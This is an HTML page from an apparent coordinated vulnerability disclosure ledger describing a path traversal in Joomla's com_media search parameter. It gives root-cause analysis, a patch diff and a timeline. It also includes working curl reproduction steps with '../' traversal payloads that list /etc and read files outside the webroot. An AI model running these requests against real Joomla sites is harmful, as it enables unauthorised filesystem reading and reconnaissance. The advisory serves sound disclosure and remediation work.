@@ -1,0 +1,411 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-GSV3GS1G · joomla/joomla-cms</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-GSV3GS1G · joomla/joomla-cms</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  path-traversal
+  <span class="sev-badge sev-medium">medium</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-40384">CVE-2026-40384</a>
+  <a class="id-badge" href="https://github.com/advisories/GHSA-hr66-rv65-f5r4">GHSA-hr66-rv65-f5r4</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-medium">medium</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-GSV3GS1G: Path Traversal via Glob Injection in com_media Search</h1>
+<p>The Joomla Media Manager (<code>com_media</code>) exposes a file search endpoint that passes the user-supplied <code>search</code> parameter directly into a <code>glob()</code> pattern without sanitization. While the <code>path</code> parameter is properly validated via <code>Path::check()</code> (which rejects <code>..</code>), the <code>search</code> parameter receives no such validation.</p>
+<p>An <strong>Author-level</strong> user (Joomla's default content-creation group, which has <code>core.create</code> on <code>com_media</code>) can inject <code>../</code> sequences into the <code>search</code> parameter to escape the media sandbox (<code>/images</code>) and:</p>
+<ol>
+<li><strong>Enumerate the entire server filesystem</strong> — directories are never filtered</li>
+<li><strong>Read the contents</strong> of any file with an allowed media extension (<code>.txt</code>, <code>.csv</code>, <code>.pdf</code>, <code>.doc</code>, <code>.xls</code>, <code>.jpg</code>, <code>.png</code>, etc.) <strong>anywhere on the filesystem</strong>, including outside the webroot</li>
+</ol>
+<p>This breaks the fundamental security boundary of the media adapter, which is supposed to jail all operations inside the configured media root (<code>/var/www/html/images</code>).</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> joomla/joomla-cms<br>
+<strong>Commit:</strong> <code>b794d03bd42cf8ba</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>The root cause is that LocalAdapter::search() builds <code>$pattern = Path::clean($this-&gt;getLocalPath($path) . '/*' . $needle . '*')</code> where <code>$needle</code> is attacker-controlled and unvalidated; Path::clean() only normalizes slashes and does not strip <code>..</code>, and PHP's glob() resolves <code>..</code> segments during pattern expansion. The existing Path::check() guard is applied only to <code>$path</code>, not to the search needle, so the sandbox boundary is enforced on the wrong input.</p>
+<h2>Reproduction</h2>
+<p>This finding was identified by static analysis and has not yet been dynamically reproduced. The Technical Details section above describes the code path; a trigger input is not included.</p>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-GSV3GS1G.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-GSV3GS1G<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h2>Vulnerability Header</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Vulnerability Title</td>
+<td>Path Traversal via Glob Injection in com_media Search Parameter</td>
+</tr>
+<tr>
+<td>Severity Rating</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Bug Category</td>
+<td>Path Traversal</td>
+</tr>
+<tr>
+<td>Location</td>
+<td><code>plugins/filesystem/local/src/Adapter/LocalAdapter.php:749</code>, <code>search()</code></td>
+</tr>
+<tr>
+<td>Affected Versions</td>
+<td>Joomla 6.0.4</td>
+</tr>
+</tbody>
+</table>
+<h2>Executive Summary</h2>
+<p>The <code>search</code> parameter in Joomla's Media Manager API (<code>com_media</code>) is concatenated directly into a <code>glob()</code> pattern at <code>LocalAdapter::search()</code> without any path validation. While the <code>path</code> parameter is correctly protected by <code>Path::check()</code> (which rejects <code>..</code> sequences), the <code>search</code> parameter receives no such validation — only the <code>STRING</code> input filter is applied, which strips HTML tags but not path separators or traversal sequences. An Author-level user (the lowest content-creation role in Joomla's default ACL) can inject <code>/../../../../../</code> into <code>search</code> to escape the <code>/images/</code> media sandbox, enumerate the entire server filesystem, and read the contents of any file with an allowed media extension (<code>.txt</code>, <code>.csv</code>, <code>.pdf</code>, <code>.doc</code>, <code>.xls</code>, images, etc.) anywhere on disk. The <code>isMediaFile()</code> extension filter blocks <code>.php</code>, <code>.conf</code>, <code>.key</code>, <code>.pem</code>, and extensionless files, which prevents direct credential theft from files like <code>configuration.php</code> or <code>/etc/passwd</code> — but <code>.txt</code>/<code>.csv</code> backups and exports are fully readable.</p>
+<h2>Root Cause Analysis</h2>
+<h3>Technical Description</h3>
+<p>The Media Manager exposes a file search endpoint via <code>ApiController::getFiles()</code>. The <code>search</code> parameter flows through the model unchanged and reaches <code>LocalAdapter::search()</code>, where it is concatenated into a <code>glob()</code> pattern:</p>
+<pre tabindex="0"><code class="language-php">// plugins/filesystem/local/src/Adapter/LocalAdapter.php:747-764
+public function search(string $path, string $needle, bool $recursive = false): array
+{
+    $pattern = Path::clean($this-&gt;getLocalPath($path) . '/*' . $needle . '*');
+    //                      ^^^^^^^^^^^^^^^^^^^^^^^^^^         ^^^^^^^
+    //                      Validated (Path::check)            NOT validated
+
+    if ($recursive) {
+        $results = $this-&gt;rglob($pattern);
+    } else {
+        $results = glob($pattern);   // glob() resolves `..` during pattern expansion
+    }
+
+    $searchResults = [];
+    foreach ($results as $result) {
+        $searchResults[] = $this-&gt;getPathInformation($result);
+    }
+    return $searchResults;
+}
+</code></pre>
+<p>PHP's <code>glob()</code> resolves <code>..</code> segments during pattern matching. Given media root <code>/var/www/html/images</code> with default subdirectories <code>banners/</code>, <code>headers/</code>, <code>sampledata/</code>:</p>
+<pre tabindex="0"><code>Pattern:  /var/www/html/images/*/../../../../../etc/*
+          │                    │  │
+          │                    │  └─ 5 × `..` climbs to `/`
+          │                    └─ matches banners, headers, sampledata
+          └─ rootPath (trusted)
+
+Resolves to → /etc/*
+</code></pre>
+<p>The <code>Path::clean()</code> call only normalizes directory separators — it does <strong>not</strong> strip <code>..</code> (unlike <code>Path::check()</code>, which throws on traversal sequences). The <code>STRING</code> input filter at the controller strips HTML tags only; <code>/</code>, <code>.</code>, <code>..</code> all pass through.</p>
+<p>When <code>content=1</code> is supplied, the traversal path flows into <code>LocalAdapter::getResource()</code> at line 212, which performs a raw <code>fopen($this-&gt;rootPath . '/' . $path, 'r')</code> with no path validation — enabling actual file content read, not just enumeration. The file content is returned as the base64-encoded <code>content</code> attribute.</p>
+<h3>First Faulty Condition</h3>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th><code>plugins/filesystem/local/src/Adapter/LocalAdapter.php</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Line</td>
+<td>749</td>
+</tr>
+<tr>
+<td>Condition</td>
+<td><code>$needle</code> (user-supplied search term) is concatenated into the glob pattern without any path validation or sanitization. Every other path-accepting method in <code>LocalAdapter</code> routes through <code>getLocalPath()</code> → <code>Path::check()</code>. The <code>search()</code> method is the only one that concatenates user input <em>after</em> the <code>getLocalPath()</code> call.</td>
+</tr>
+</tbody>
+</table>
+<h3>Trace Analysis</h3>
+<ol>
+<li><code>ApiController::getFiles()</code> at <code>administrator/components/com_media/src/Controller/ApiController.php:128</code> — <code>$options['search'] = $this-&gt;input-&gt;getString('search', '')</code> accepts the search term with <code>STRING</code> filter only (strips HTML, not path chars).</li>
+<li><code>ApiModel::getFiles()</code> at <code>administrator/components/com_media/src/Model/ApiModel.php:110-112</code> — forwards <code>$options['search']</code> as <code>$needle</code> to the adapter unchanged.</li>
+<li><code>ApiModel::search()</code> at <code>ApiModel.php:430-433</code> — <code>return $this-&gt;getAdapter($adapter)-&gt;search($path, $needle, $recursive)</code> — still unchanged.</li>
+<li><code>LocalAdapter::search()</code> at <code>LocalAdapter.php:749</code> — <code>$pattern = Path::clean($this-&gt;getLocalPath($path) . '/*' . $needle . '*')</code> — <code>$needle</code> concatenated raw into glob pattern.</li>
+<li><code>LocalAdapter.php:754</code> — <code>$results = glob($pattern)</code> — <code>glob()</code> resolves <code>..</code> during pattern matching, escaping the sandbox.</li>
+<li><code>LocalAdapter::getResource()</code> at <code>LocalAdapter.php:212</code> — <code>fopen($this-&gt;rootPath . '/' . $path, 'r')</code> — when <code>content=1</code> is set, the traversal path from glob results enables actual file content read with no <code>Path::check()</code>.</li>
+</ol>
+<h2>Exploitability Assessment</h2>
+<h3>Attack Vector &amp; Reachability</h3>
+<table>
+<thead>
+<tr>
+<th>Attack vector</th>
+<th>Network</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Authentication required</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>User interaction required</td>
+<td>None</td>
+</tr>
+<tr>
+<td>Reachable in default config</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Entry point(s)</td>
+<td><code>GET /index.php?option=com_media&amp;task=api.files&amp;format=json&amp;path=local-images:/&amp;search=/../../../../../{target}&amp;recursive=0&amp;content=1&amp;mediatypes=0,1,2,3</code></td>
+</tr>
+</tbody>
+</table>
+<p>The attacker can enumerate every directory on the filesystem with no filtering, and read the full contents of any file matching the allowed extension set. A standard file-system permissions apply. While the extension filter prevents reading <code>.php</code> config files or <code>/etc/passwd</code> directly, the readable set is broad enough to capture <code>configuration.php.txt</code> backups, <code>.csv</code> database exports, <code>.txt</code> cron scripts, and private documents stored outside the webroot. Directory enumeration alone reveals installed software versions, backup locations, and system layout useful for targeting other vulnerabilities.</p>
+<h3>Reproduction Steps</h3>
+<p><strong>Environment</strong>
+The issue was reproduced using Joomla 6.0.4 on Ubuntu 24.04.4 LTS.</p>
+<p><strong>Prerequisites:</strong> 
+An Author-level Joomla account (group 3). This is the minimum content-creation role, commonly granted to contributors on multi-author sites.</p>
+<p><strong>Steps to reproduce</strong>:</p>
+<pre tabindex="0"><code class="language-bash"># 1. Log in as Author user, obtain session cookie
+curl -s -L -c cookies.txt &quot;http://TARGET/index.php/component/users/login&quot; -o login.html
+CSRF=$(grep -oE 'csrf.token&quot;:&quot;[a-f0-9]{32}&quot;' login.html | head -1 | grep -oE '[a-f0-9]{32}')
+curl -s -b cookies.txt -c cookies.txt \
+    &quot;http://TARGET/index.php&quot; \
+    --data-urlencode &quot;username=AUTHOR_USER&quot; \
+    --data-urlencode &quot;password=AUTHOR_PASS&quot; \
+    -d &quot;option=com_users&amp;task=user.login&amp;return=aW5kZXgucGhw&amp;${CSRF}=1&quot;
+
+# 2. CONTROL: Verify traversal in `path` parameter is blocked
+curl -s -b cookies.txt \
+    &quot;http://TARGET/index.php?option=com_media&amp;task=api.files&amp;format=json&amp;path=local-images%3A%2F..%2F..%2Fetc&amp;mediatypes=0%2C1%2C2%2C3&quot;
+# Expected: 400 Bad Request — &quot;Use of relative paths not permitted&quot;
+
+# 3. EXPLOIT: Directory enumeration via traversal in `search` parameter
+curl -s -b cookies.txt \
+    &quot;http://TARGET/index.php?option=com_media&amp;task=api.files&amp;format=json&amp;path=local-images%3A%2F&amp;search=%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&amp;recursive=0&amp;mediatypes=0%2C1%2C2%2C3&quot;
+# Expected: 200 OK with JSON listing /etc/ directory contents
+
+# 4. EXPLOIT: File content read outside webroot
+curl -s -b cookies.txt \
+    &quot;http://TARGET/index.php?option=com_media&amp;task=api.files&amp;format=json&amp;path=local-images%3A%2F&amp;search=%2F..%2F..%2F..%2F..%2F..%2Fusr%2Flib%2Fpython3.12%2FLICENSE.txt&amp;recursive=0&amp;content=1&amp;mediatypes=0%2C1%2C2%2C3&quot;
+# Expected: 200 OK with base64-encoded file content in the &quot;content&quot; field
+</code></pre>
+<p><strong>Expected output:</strong></p>
+<p>Steps 2 vs 3 form the clean differential: identical privilege level, identical traversal sequence, only the parameter name differs. <code>path</code> is validated by <code>Path::check()</code>; <code>search</code> is not. 
+Step 3 returns ~144 results listing <code>/etc/</code> directories. 
+Step 4 returns file contents as base64 in the JSON response.</p>
+<p>PoC files</p>
+<ul>
+<li><code>poc.py</code> — Python 3 script that creates an Author user (setup via DB), logs in via HTTP, runs baseline controls and exploit cases, and verifies file content byte-matches disk. Run with <code>python3 poc.py</code>.</li>
+</ul>
+<h2>Recommended Fix</h2>
+<p><strong>Option 1 (primary) — Validate <code>$needle</code> in <code>LocalAdapter::search()</code>:</strong> A search term is semantically a filename fragment, not a path. Reject path separators and escape glob metacharacters:</p>
+<pre tabindex="0"><code class="language-php">public function search(string $path, string $needle, bool $recursive = false): array
+{
+    // Search term must be a filename fragment, not a path
+    if (preg_match('#[/\\\\]#', $needle) || str_contains($needle, '..')) {
+        throw new InvalidPathException('Search term may not contain path separators');
+    }
+
+    // Escape glob metacharacters so the term is matched literally
+    $needle = addcslashes($needle, '*?[]{}\\');
+
+    $pattern = Path::clean($this-&gt;getLocalPath($path) . '/*' . $needle . '*');
+    // ... rest unchanged
+}
+</code></pre>
+<p><strong>Option 2 (defense in depth) — Validate glob results against <code>rootPath</code>:</strong> Even if <code>$needle</code> is cleaned, validate each glob result to ensure it hasn't escaped the sandbox:</p>
+<pre tabindex="0"><code class="language-php">foreach ($results as $result) {
+    $real = realpath($result);
+    if ($real === false || !str_starts_with($real . '/', $this-&gt;rootPath . '/')) {
+        continue;   // result escaped the sandbox — discard
+    }
+    $searchResults[] = $this-&gt;getPathInformation($real);
+}
+</code></pre>
+<p><strong>Option 3 (harden <code>getResource()</code>):</strong> Route through the existing <code>getLocalPath()</code> → <code>Path::check()</code> guard like every other method in <code>LocalAdapter</code>:</p>
+<pre tabindex="0"><code class="language-php">public function getResource(string $path)
+{
+    return fopen($this-&gt;getLocalPath($path), 'r');   // goes through Path::check()
+}
+</code></pre>
+<p>This single-line change would block the <code>content=1</code> file read even if the glob traversal remains, because the traversal path would fail <code>Path::check()</code>.</p>
+<p>Patch provenance: AI-generated + Human-reviewed</p>
+<h2>References</h2>
+<ul>
+<li>CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</li>
+<li>CVE-2019-10945 — prior com_media directory traversal in Joomla &lt;=3.9.4 (<code>folder</code> parameter, different codebase)</li>
+<li>CVE-2020-24597 — prior com_media traversal in Joomla &lt;=3.9.20 (root-path config, different architecture)</li>
+</ul>
+<h2>Attribution</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by <strong>Adrian Denkiewicz</strong> at <strong>Doyensec</strong> in collaboration with Anthropic Research.</p>
+<p>For CVE credits and public acknowledgments: <strong>Doyensec in collaboration with Claude and Anthropic Research</strong></p>
+<h2>Attachment: <code>diff.patch</code></h2>
+<pre tabindex="0"><code>diff --git a/plugins/filesystem/local/src/Adapter/LocalAdapter.php b/plugins/filesystem/local/src/Adapter/LocalAdapter.php
+index 9f8ecd9..74e48d9 100644
+--- a/plugins/filesystem/local/src/Adapter/LocalAdapter.php
++++ b/plugins/filesystem/local/src/Adapter/LocalAdapter.php
+@@ -209,7 +209,7 @@ class LocalAdapter implements AdapterInterface
+      */
+     public function getResource(string $path)
+     {
+-        return fopen($this-&gt;rootPath . '/' . $path, 'r');
++        return fopen($this-&gt;getLocalPath($path), 'r');
+     }
+
+     /**
+@@ -746,6 +746,14 @@ class LocalAdapter implements AdapterInterface
+      */
+     public function search(string $path, string $needle, bool $recursive = false): array
+     {
++        // Search term must be a filename fragment, not a path
++        if (preg_match('#[/\\\\]#', $needle) || str_contains($needle, '..')) {
++            throw new InvalidPathException('Search term may not contain path separators');
++        }
++
++        // Escape glob metacharacters so the term is matched literally
++        $needle = addcslashes($needle, '*?[]{}\\');
++
+         $pattern = Path::clean($this-&gt;getLocalPath($path) . '/*' . $needle . '*');
+
+         if ($recursive) {
+@@ -757,7 +765,13 @@ class LocalAdapter implements AdapterInterface
+         $searchResults = [];
+
+         foreach ($results as $result) {
+-            $searchResults[] = $this-&gt;getPathInformation($result);
++            $real = realpath($result);
++
++            if ($real === false || !str_starts_with($real . '/', $this-&gt;rootPath . '/')) {
++                continue;
++            }
++
++            $searchResults[] = $this-&gt;getPathInformation($real);
+         }
+
+         return $searchResults;
+</code></pre></div>
+
+
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-03-30</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-23</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-28</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-28</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">d7de4969efd4f3d7e9c4921183300a215f7ed12cf7cc72a058f666216d45394f963e93d1e9c78a2e73dcd3471c8548e8160cef16bacaed927db723f7e4ea78f5</p>
+<p class="kicker">Committed 2026-04-23 07:04 UTC</p>
+<p class="kicker">Revealed 2026-05-28 18:00 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-GSV3GS1G-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-GSV3GS1G%22%2C%22bug_class%22%3A%22Path-traversal%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%22b794d03bd42cf8ba%22%2C%22created_at%22%3A%222026-03-30T23%3A19%3A37%2B00%3A00%22%2C%22description%22%3A%22The%20Joomla%20Media%20Manager%20%28%60com_media%60%29%20exposes%20a%20file%20search%20endpoint%20that%20passes%20the%20user-supplied%20%60search%60%20parameter%20directly%20into%20a%20%60glob%28%29%60%20pattern%20without%20sanitization.%20While%20the%20%60path%60%20parameter%20is%20properly%20validated%20via%20%60Path%3A%3Acheck%28%29%60%20%28which%20rejects%20%60..%60%29%2C%20the%20%60search%60%20parameter%20receives%20no%20such%20validation.%5Cn%5CnAn%20%2A%2AAuthor-level%2A%2A%20user%20%28Joomla%27s%20default%20content-creation%20group%2C%20which%20has%20%60core.create%60%20on%20%60com_media%60%29%20can%20inject%20%60../%60%20sequences%20into%20the%20%60search%60%20parameter%20to%20escape%20the%20media%20sandbox%20%28%60/images%60%29%20and%3A%5Cn%5Cn1.%20%2A%2AEnumerate%20the%20entire%20server%20filesystem%2A%2A%20%E2%80%94%20directories%20are%20never%20filtered%5Cn2.%20%2A%2ARead%20the%20contents%2A%2A%20of%20any%20file%20with%20an%20allowed%20media%20extension%20%28%60.txt%60%2C%20%60.csv%60%2C%20%60.pdf%60%2C%20%60.doc%60%2C%20%60.xls%60%2C%20%60.jpg%60%2C%20%60.png%60%2C%20etc.%29%20%2A%2Aanywhere%20on%20the%20filesystem%2A%2A%2C%20including%20outside%20the%20webroot%5Cn%5CnThis%20breaks%20the%20fundamental%20security%20boundary%20of%20the%20media%20adapter%2C%20which%20is%20supposed%20to%20jail%20all%20operations%20inside%20the%20configured%20media%20root%20%28%60/var/www/html/images%60%29.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3Anull%2C%22poc_sha256%22%3A%222582bdc36655e31e92c9e5397a55a7315b2ba50f0c5c176e25ad0f5299285bb0%22%2C%22preimage_version%22%3A1%2C%22project%22%3A%22joomla%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3A%22The%20root%20cause%20is%20that%20LocalAdapter%3A%3Asearch%28%29%20builds%20%60%24pattern%20%3D%20Path%3A%3Aclean%28%24this-%3EgetLocalPath%28%24path%29%20.%20%27/%2A%27%20.%20%24needle%20.%20%27%2A%27%29%60%20where%20%60%24needle%60%20is%20attacker-controlled%20and%20unvalidated%3B%20Path%3A%3Aclean%28%29%20only%20normalizes%20slashes%20and%20does%20not%20strip%20%60..%60%2C%20and%20PHP%27s%20glob%28%29%20resolves%20%60..%60%20segments%20during%20pattern%20expansion.%20The%20existing%20Path%3A%3Acheck%28%29%20guard%20is%20applied%20only%20to%20%60%24path%60%2C%20not%20to%20the%20search%20needle%2C%20so%20the%20sandbox%20boundary%20is%20enforced%20on%20the%20wrong%20input.%22%2C%22title%22%3A%22Path%20Traversal%20via%20Glob%20Injection%20in%20com_media%20Search%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-GSV3GS1G&#34;,
+  &#34;bug_class&#34;: &#34;Path-traversal&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: &#34;b794d03bd42cf8ba&#34;,
+  &#34;created_at&#34;: &#34;2026-03-30T23:19:37+00:00&#34;,
+  &#34;description&#34;: &#34;The Joomla Media Manager (`com_media`) exposes a file search endpoint that passes the user-supplied `search` parameter directly into a `glob()` pattern without sanitization. While the `path` parameter is properly validated via `Path::check()` (which rejects `..`), the `search` parameter receives no such validation.\n\nAn **Author-level** user (Joomla&#39;s default content-creation group, which has `core.create` on `com_media`) can inject `../` sequences into the `search` parameter to escape the media sandbox (`/images`) and:\n\n1. **Enumerate the entire server filesystem** — directories are never filtered\n2. **Read the contents** of any file with an allowed media extension (`.txt`, `.csv`, `.pdf`, `.doc`, `.xls`, `.jpg`, `.png`, etc.) **anywhere on the filesystem**, including outside the webroot\n\nThis breaks the fundamental security boundary of the media adapter, which is supposed to jail all operations inside the configured media root (`/var/www/html/images`).&#34;,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: null,
+  &#34;poc_sha256&#34;: &#34;2582bdc36655e31e92c9e5397a55a7315b2ba50f0c5c176e25ad0f5299285bb0&#34;,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;joomla&#34;,
+  &#34;reproduction&#34;: null,
+  &#34;technical_details&#34;: &#34;The root cause is that LocalAdapter::search() builds `$pattern = Path::clean($this-&gt;getLocalPath($path) . &#39;/*&#39; . $needle . &#39;*&#39;)` where `$needle` is attacker-controlled and unvalidated; Path::clean() only normalizes slashes and does not strip `..`, and PHP&#39;s glob() resolves `..` segments during pattern expansion. The existing Path::check() guard is applied only to `$path`, not to the search needle, so the sandbox boundary is enforced on the wrong input.&#34;,
+  &#34;title&#34;: &#34;Path Traversal via Glob Injection in com_media Search&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
